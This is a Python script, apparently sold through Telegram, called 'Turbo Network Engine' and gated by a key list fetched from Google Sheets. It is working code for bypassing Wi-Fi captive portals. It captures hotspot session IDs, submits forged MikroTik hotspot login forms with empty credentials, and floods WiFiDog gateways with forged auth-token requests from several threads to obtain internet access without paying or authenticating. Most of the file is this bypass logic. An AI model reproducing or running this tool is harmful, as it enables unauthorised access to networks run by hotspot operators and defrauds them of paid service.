#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Turbo Network Engine v2.1 - Complete System
With Auto Installer, Banner Display & MikroTik Support
"""

import requests
import re
import urllib3
import time
import threading
import logging
import random
import os
import sys
import subprocess
import importlib.util
from urllib.parse import urlparse, parse_qs, urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===============================
# COLOR SYSTEM
# ===============================
black = "\033[0;30m"
red = "\033[0;31m"
bred = "\033[1;31m"
green = "\033[0;32m"
bgreen = "\033[1;32m"
yellow = "\033[0;33m"
byellow = "\033[1;33m"
blue = "\033[0;34m"
bblue = "\033[1;34m"
purple = "\033[0;35m"
bpurple = "\033[1;35m"
cyan = "\033[0;36m"
bcyan = "\033[1;36m"
white = "\033[0;37m"
reset = "\033[00m"

# ===============================
# KEY APPROVAL SYSTEM
# ===============================
SHEET_ID = "1SfizOga-9kZKvgcDvTMr6NLuZyq9J2PbLruRMaOYX44"
SHEET_CSV_URL = f"https://docs.google.com/spreadsheets/d/{SHEET_ID}/export?format=csv&gid=0"
LOCAL_KEYS_FILE = os.path.expanduser("~/.turbo_approved_keys.txt")

def get_system_key():
    """Get unique system key for this device"""
    try:
        uid = os.geteuid()
    except AttributeError:
        uid = 1000
    try:
        username = os.getlogin()
    except:
        username = os.environ.get('USER', 'unknown')
    return f"{uid}{username}"

def fetch_authorized_keys():
    """Fetch authorized keys from Google Sheets"""
    keys = []
    try:
        response = requests.get(SHEET_CSV_URL, timeout=10)
        if response.status_code == 200:
            for line in response.text.strip().split('\n'):
                line = line.strip()
                if line and not line.startswith('username') and not line.startswith('key'):
                    key = line.split(',')[0].strip().strip('"')
                    if key:
                        keys.append(key)
            if keys:
                try:
                    with open(LOCAL_KEYS_FILE, 'w') as f:
                        f.write('\n'.join(keys))
                except:
                    pass
            return keys
    except:
        pass
    try:
        if os.path.exists(LOCAL_KEYS_FILE):
            with open(LOCAL_KEYS_FILE, 'r') as f:
                keys = [line.strip() for line in f if line.strip()]
            return keys
    except:
        pass
    return keys

def check_approval():
    """Check if system key is approved"""
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"{bcyan}╔══════════════════════════════════════════════════════════════════╗")
    print(f"║                    KEY APPROVAL SYSTEM                               ║")
    print(f"╚══════════════════════════════════════════════════════════════════╝{reset}")
    print(f"\n{bcyan}[!] Checking approval status...{reset}")
    system_key = get_system_key()
    authorized_keys = fetch_authorized_keys()
    print(f"{white}[*] System Key: {system_key}{reset}")
    print(f"{white}[*] Authorized Keys: {len(authorized_keys)}{reset}")
    if system_key in authorized_keys:
        print(f"\n{bgreen}╔══════════════════════════════════════════════════════════════════╗")
        print(f"║                    ✓ KEY APPROVED ✓                                 ║")
        print(f"║                    Turbo Engine Unlocked                            ║")
        print(f"╚══════════════════════════════════════════════════════════════════╝{reset}")
        time.sleep(1.5)
        return True
    else:
        print(f"\n{bred}╔══════════════════════════════════════════════════════════════════╗")
        print(f"║                    ❌ KEY NOT APPROVED ❌                           ║")
        print(f"╠══════════════════════════════════════════════════════════════════╣")
        print(f"║                                                                  ║")
        print(f"║  {yellow}To buy this tool, contact:{reset}                                 ║")
        print(f"║                                                                  ║")
        print(f"║     {bcyan}📱 Telegram:{reset}  @Zeldris                                      ║")
        print(f"║     {bcyan}📢 Channel:{reset}  t.me/zelwithz                                 ║")
        print(f"║                                                                  ║")
        print(f"║  {yellow}Your Key: {system_key}{reset}                                             ║")
        print(f"║  {yellow}Send this key to buy the tool{reset}                                        ║")
        print(f"║                                                                  ║")
        print(f"╚══════════════════════════════════════════════════════════════════╝{reset}")
        return False

# ===============================
# BANNER DISPLAY (unchanged)
# ===============================
def display_banner():
    """Display the hacker banner"""
    banner_text = f"""
{bred}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓{reset}
{bred}┃                                                ┃{reset}
{bred}┃{bgreen}      ⣠⣴⣶⣿⣿⠿⣷⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣶⣷⠿⣿⣿⣶⣦⣀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen} ⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣶⣦⣬⡉⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠚⢉⣥⣴⣾⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen} ⠀⠀⠀⡾⠿⠛⠛⠛⠛⠿⢿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⣿⣿⣿⣿⣿⠿⠿⠛⠛⠛⠛⠿⢧⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⡿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen} ⠀⠀⠀⠀⠀⠀⠀⣠⣤⠶⠶⠶⠰⠦⣤⣀⠀⠙⣷⠀⠀⠀⠀⠀⠀⠀⢠⡿⠋⢀⣀⣤⢴⠆⠲⠶⠶⣤⣄⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen} ⠀⠘⣆⠀⠀⢠⣾⣫⣶⣾⣿⣿⣿⣿⣷⣯⣿⣦⠈⠃⡇⠀⠀⠀⠀⢸⠘⢁⣶⣿⣵⣾⣿⣿⣿⣿⣷⣦⣝⣷⡄⠀⠀⡰⠂⠀ {bred}┃{reset}
{bred}┃{bgreen} ⠀⠀⣨⣷⣶⣿⣧⣛⣛⠿⠿⣿⢿⣿⣿⣛⣿⡿⠀⠀⡇⠀⠀⠀⠀⢸⠀⠈⢿⣟⣛⠿⢿⡿⢿⢿⢿⣛⣫⣼⡿⣶⣾⣅⡀⠀ {bred}┃{reset}
{bred}┃{bgreen} ⢀⡼⠋⠁⠀⠀⠈⠉⠛⠛⠻⠟⠸⠛⠋⠉⠁⠀⠀⢸⡇⠀⠀⠄⠀⢸⡄⠀⠀⠈⠉⠙⠛⠃⠻⠛⠛⠛⠉⠁⠀⠀⠈⠙⢧⡀ {bred}┃{reset}
{bred}┃{bgreen} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡇⢠⠀⠀⠀⢸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⡇⠀⠀⠀⠀⢸⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠟⠁⣿⠇⠀⠀⠀⠀⢸⡇⠙⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen} ⠀⠰⣄⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⠖⡾⠁⠀⠀⣿⠀⠀⠀⠀⠀⠘⣿⠀⠀⠙⡇⢸⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠄⠀ {bred}┃{reset}
{bred}┃{bgreen} ⠀⠀⢻⣷⡦⣤⣤⣤⡴⠶⠿⠛⠉⠁⠀⢳⠀⢠⡀⢿⣀⠀⠀⠀⠀⣠⡟⢀⣀⢠⠇⠀⠈⠙⠛⠷⠶⢦⣤⣤⣤⢴⣾⡏⠀⠀ {bred}┃{reset}
{bred}┃{bgreen}  ⠀⠈⣿⣧⠙⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⢊⣙⠛⠒⠒⢛⣋⡚⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⡿⠁⣾⡿⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen}⠀ ⠀⠀⠘⣿⣇⠈⢿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⡿⢿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⡟⠁⣼⡿⠁⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen}⠀⠀ ⠀⠀⠘⣿⣦⠀⠻⣿⣷⣦⣤⣤⣶⣶⣶⣿⣿⣿⣿⠏⠀⠀⠻⣿⣿⣿⣿⣶⣶⣶⣦⣤⣴⣿⣿⠏⢀⣼⡿⠁⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen}⠀⠀⠀ ⠀⠀⠘⢿⣷⣄⠙⠻⠿⠿⠿⠿⠿⢿⣿⣿⣿⣁⣀⣀⣀⣀⣙⣿⣿⣿⠿⠿⠿⠿⠿⠿⠟⠁⣠⣿⡿⠁⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen}⠀⠀⠀⠀ ⠀⠀⠈⠻⣯⠙⢦⣀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⣠⠴⢋⣾⠟⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen}⠀⠀⠀⠀⠀ ⠀⠀⠀⠙⢧⡀⠈⠉⠒⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠐⠒⠉⠁⢀⡾⠃⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen}⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠈⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⣠⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen}⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠘⢦⡀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⢀⡴⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen}⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen}⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃                                                ┃{reset}
{bred}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛{reset}
"""
    print(banner_text)
    time.sleep(1.5)

# ===============================
# AUTO INSTALLER
# ===============================
def auto_install_dependencies():
    """Auto install required dependencies"""
    required_packages = ['requests', 'urllib3']
    missing_packages = []
    print(f"{bcyan}[*] Checking dependencies...{reset}")
    for package in required_packages:
        if importlib.util.find_spec(package) is None:
            missing_packages.append(package)
    if missing_packages:
        print(f"{yellow}[!] Missing packages: {', '.join(missing_packages)}{reset}")
        print(f"{bcyan}[*] Installing dependencies...{reset}")
        for package in missing_packages:
            try:
                subprocess.check_call([sys.executable, '-m', 'pip', 'install', package, '--quiet'])
                print(f"{green}[✓] Installed: {package}{reset}")
            except Exception as e:
                print(f"{red}[X] Failed to install {package}: {e}{reset}")
        print(f"{green}[✓] All dependencies installed!{reset}")
        time.sleep(1)
    else:
        print(f"{green}[✓] All dependencies already installed!{reset}")
        time.sleep(0.5)

# ===============================
# TURBO ENGINE CONFIG
# ===============================
PING_THREADS = 5
MIN_INTERVAL = 0.05
MAX_INTERVAL = 0.2
DEBUG = False
stop_event = threading.Event()

def check_real_internet():
    """Check if real internet is accessible"""
    try:
        return requests.get("http://www.google.com", timeout=3).status_code == 200
    except:
        return False

# ===============================
# NEW: MikroTik Captive Portal Authentication
# ===============================
def detect_mikrotik(response_text, response_url):
    """
    Simple heuristic: if the redirect URL contains /login or /hotspot,
    or the page has typical MikroTik hotspot elements, we treat it as MikroTik.
    """
    url_lower = response_url.lower()
    text_lower = response_text.lower()
    if "/login" in url_lower or "hotspot" in url_lower or "mikrotik" in text_lower:
        return True
    # Look for form action typically containing "login"
    if re.search(r'<form[^>]+action="(https?://[^"]*login[^"]*)"', response_text, re.IGNORECASE):
        return True
    return False

def extract_login_form(response_text, base_url):
    """
    Extract the login form's action URL and hidden fields from the MikroTik hotspot page.
    Returns (action_url, data_dict) where data_dict includes hidden inputs.
    """
    action = ""
    data = {}
    # Find form action
    form_match = re.search(r'<form[^>]+action="([^"]+)"', response_text, re.IGNORECASE)
    if form_match:
        action = urljoin(base_url, form_match.group(1))
    else:
        # Fallback: assume /login
        action = urljoin(base_url, '/login')
    # Find all input fields of type hidden, and also keep common fields
    inputs = re.findall(r'<input[^>]+>', response_text, re.IGNORECASE)
    for inp in inputs:
        name_match = re.search(r'name="([^"]+)"', inp, re.IGNORECASE)
        value_match = re.search(r'value="([^"]*)"', inp, re.IGNORECASE)
        if name_match:
            name = name_match.group(1)
            value = value_match.group(1) if value_match else ""
            data[name] = value
    # Ensure essential fields are present (may be blank)
    if 'dst' not in data:
        data['dst'] = ''
    if 'username' not in data:
        data['username'] = ''
    if 'password' not in data:
        data['password'] = ''
    return action, data

def mikrotik_auth(session, portal_url, sid):
    """
    Attempt to authenticate on a MikroTik hotspot.
    - Fetches the login page.
    - Extracts the form action and hidden fields.
    - Adds a dummy username/password (often not needed).
    - Submits the form via POST.
    - Returns True if internet becomes available, else False.
    """
    try:
        print(f"{cyan}[*] MikroTik hotspot detected, preparing login...{reset}")
        r1 = session.get(portal_url, verify=False, timeout=10)
        login_action, form_data = extract_login_form(r1.text, portal_url)

        # Insert the session ID (often stored in a hidden field like 'id' or 'sid')
        # We'll also add it as 'sid' if the form uses that.
        if 'id' not in form_data and 'sid' not in form_data:
            # Try to add sid where applicable; MikroTik might call it 'id'
            form_data['id'] = sid
        else:
            # Overwrite with captured sid if field exists
            if 'sid' in form_data:
                form_data['sid'] = sid
            if 'id' in form_data:
                form_data['id'] = sid

        # Most public MikroTik hotspots require no real credentials;
        # we leave username/password empty or as defaults.
        form_data['username'] = form_data.get('username', '')
        form_data['password'] = form_data.get('password', '')

        print(f"{green}[✓]{reset} Form action: {login_action}")
        print(f"{green}[✓]{reset} Posting data: {form_data}")

        # Perform the login POST
        resp = session.post(login_action, data=form_data, verify=False, timeout=10)
        if resp.status_code in (200, 302):
            time.sleep(2)
            # Check if internet is now reachable
            if check_real_internet():
                print(f"{bgreen}[✓] MikroTik login successful! Internet active.{reset}")
                return True
            else:
                print(f"{yellow}[!] Login POST sent, but internet not yet active.{reset}")
                return False
        else:
            print(f"{red}[X] Login failed with status {resp.status_code}{reset}")
            return False
    except Exception as e:
        print(f"{red}[X] MikroTik auth error: {e}{reset}")
        return False

# ===============================
# HIGH SPEED PING (modified for MikroTik)
# ===============================
def high_speed_ping(auth_link, sid, session):
    """
    For non-MikroTik portals (WiFiDog style) we still use the GET-based keep-alive.
    For MikroTik we already performed a login POST, so this function is not used.
    We keep it for backward compatibility.
    """
    ping_count = 0
    success_count = 0
    while not stop_event.is_set():
        try:
            start = time.time()
            r = session.get(auth_link, timeout=5)
            elapsed = (time.time() - start) * 1000
            ping_count += 1
            success_count += 1
            if elapsed < 50:
                color = green
            elif elapsed < 100:
                color = yellow
            else:
                color = red
            print(f"{color}[✓]{reset} SID {sid[:8]} | Ping: {elapsed:.1f}ms | Success: {success_count}/{ping_count}", end="\r")
        except requests.exceptions.Timeout:
            ping_count += 1
            print(f"{red}[X]{reset} SID {sid[:8]} | TIMEOUT | Success: {success_count}/{ping_count}", end="\r")
        except requests.exceptions.ConnectionError:
            ping_count += 1
            print(f"{red}[X]{reset} SID {sid[:8]} | Connection Lost | Success: {success_count}/{ping_count}", end="\r")
        except Exception as e:
            if DEBUG:
                print(f"{red}[!]{reset} Error: {e}", end="\r")
        time.sleep(random.uniform(MIN_INTERVAL, MAX_INTERVAL))

# ===============================
# START TURBO ENGINE (MikroTik aware)
# ===============================
def start_turbo_engine():
    os.system('clear' if os.name == 'posix' else 'cls')
    display_banner()
    print(f"{bcyan}╔══════════════════════════════════════════════════════════════════╗")
    print(f"║                    TURBO NETWORK ENGINE v2.1                        ║")
    print(f"║                    MikroTik & Pro Edition                           ║")
    print(f"╚══════════════════════════════════════════════════════════════════╝{reset}\n")
    print(f"\n{cyan}[*] Network Status:{reset}")
    print(f"    Checking internet connectivity...")
    if check_real_internet():
        print(f"    {green}[✓] Internet is already active{reset}")
        return  # No need to bypass

    print(f"\n{cyan}[*] Starting portal detection...{reset}")
    while not stop_event.is_set():
        session = requests.Session()
        test_url = "http://connectivitycheck.gstatic.com/generate_204"
        try:
            r = session.get(test_url, allow_redirects=True, timeout=5)
            if r.url == test_url:
                # No portal detected, maybe internet is on
                if check_real_internet():
                    print(f"{yellow}[•]{reset} Internet Already Active... Waiting     ", end="\r")
                    time.sleep(5)
                    continue
            portal_url = r.url
            parsed_portal = urlparse(portal_url)
            portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"
            print(f"\n{cyan}[*] Captive Portal Detected: {portal_host}{reset}")

            r1 = session.get(portal_url, verify=False, timeout=10)
            # Try to extract session ID from the URL or from the page
            sid = None
            # 1. From query parameters
            qs = parse_qs(parsed_portal.query)
            sid = qs.get('sessionId', [None])[0] or qs.get('id', [None])[0]
            if not sid:
                # 2. From page content (common patterns)
                sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r1.text)
                if sid_match:
                    sid = sid_match.group(1)
                else:
                    sid_match = re.search(r'"sid":"([^"]+)"', r1.text)
                    if sid_match:
                        sid = sid_match.group(1)
            if not sid:
                # Last resort: parse from the original redirect URL
                sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', portal_url)
                if sid_match:
                    sid = sid_match.group(1)
            if sid:
                print(f"{green}[✓]{reset} Session ID Captured: {sid}")
            else:
                print(f"{yellow}[!]{reset} Could not capture Session ID – continuing without it.")

            # Decide: MikroTik or generic?
            is_mikrotik = detect_mikrotik(r1.text, portal_url)
            if is_mikrotik:
                print(f"{bcyan}[*] RouterOS / MikroTik hotspot identified.{reset}")
                # Attempt authentication via POST
                success = mikrotik_auth(session, portal_url, sid)
                if success:
                    # After successful login, just monitor internet status
                    print(f"{green}[✓] Connected! Monitoring... (Ctrl+C to stop){reset}")
                    while not stop_event.is_set():
                        if not check_real_internet():
                            print(f"{red}[X] Internet lost, re-initiating...{reset}")
                            break  # Break inner loop to re-detect portal
                        time.sleep(5)
                    continue  # Restart portal detection
                else:
                    print(f"{yellow}[!] MikroTik login attempt failed. Retrying in 5 seconds...{reset}")
                    time.sleep(5)
                    continue
            else:
                # Original WiFiDog-style method (unchanged)
                params = parse_qs(parsed_portal.query)
                gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
                gw_port = params.get('gw_port', ['2060'])[0]
                auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"
                print(f"{purple}[*] Launching {PING_THREADS} Turbo Threads (WiFiDog mode)...{reset}")
                print(f"{cyan}[*] Target: {gw_addr}:{gw_port}{reset}")
                print(f"{yellow}[!] Press Ctrl+C to stop{reset}\n")
                threads = []
                for i in range(PING_THREADS):
                    t = threading.Thread(target=high_speed_ping, args=(auth_link, sid, session), daemon=True)
                    t.start()
                    threads.append(t)
                last_status = False
                while not stop_event.is_set():
                    is_connected = check_real_internet()
                    if is_connected and not last_status:
                        print(f"\n{green}[✓] Internet Connected!{reset}")
                    elif not is_connected and last_status:
                        print(f"\n{red}[X] Internet Disconnected! Reconnecting...{reset}")
                    last_status = is_connected
                    time.sleep(2)
                # When internet drops, the loop breaks and starts again

        except KeyboardInterrupt:
            raise
        except Exception as e:
            if DEBUG:
                logging.error(f"{red}Error: {e}{reset}")
            time.sleep(5)

# ===============================
# MENU SYSTEM
# ===============================
def show_menu():
    os.system('clear' if os.name == 'posix' else 'cls')
    display_banner()
    print(f"""
{bcyan}╔══════════════════════════════════════════════════════════════════╗
║                         MAIN MENU                                     ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║     {bgreen}[1]{reset} {cyan}Start Turbo Engine{reset} (MikroTik + Generic)                        ║
║     {bred}[2]{reset} {cyan}Exit{reset} - Close the program                               ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
    """)
    while True:
        try:
            choice = input(f"{bcyan}[?]{reset} Select option [1-2]: ").strip()
            if choice == '1':
                return 'starlink'
            elif choice == '2':
                return 'exit'
            else:
                print(f"{red}[!] Invalid option! Please choose 1 or 2{reset}")
        except KeyboardInterrupt:
            return 'exit'

# ===============================
# MAIN ENTRY POINT
# ===============================
def main():
    if not check_approval():
        sys.exit(1)
    print(f"\n{bcyan}[*] Running auto-installer...{reset}")
    auto_install_dependencies()
    while True:
        choice = show_menu()
        if choice == 'starlink':
            try:
                start_turbo_engine()
            except KeyboardInterrupt:
                stop_event.set()
                print(f"\n{red}Turbo Engine Shutdown...{reset}")
                print(f"{yellow}Press Enter to return to menu...{reset}")
                input()
                continue
        elif choice == 'exit':
            print(f"\n{green}[✓] Thank you for using Turbo Network Engine!{reset}")
            print(f"{cyan}Visit: t.me/Zeldris for updates{reset}\n")
            sys.exit(0)

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--key":
        print(f"\n{green}Your System Key: {get_system_key()}{reset}")
        print(f"{yellow}Send this key to @Zeldris to purchase{reset}")
        sys.exit(0)
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{red}Program terminated by user{reset}")
        sys.exit(0)
    except Exception as e:
        print(f"{red}Fatal Error: {e}{reset}")
        sys.exit(1)
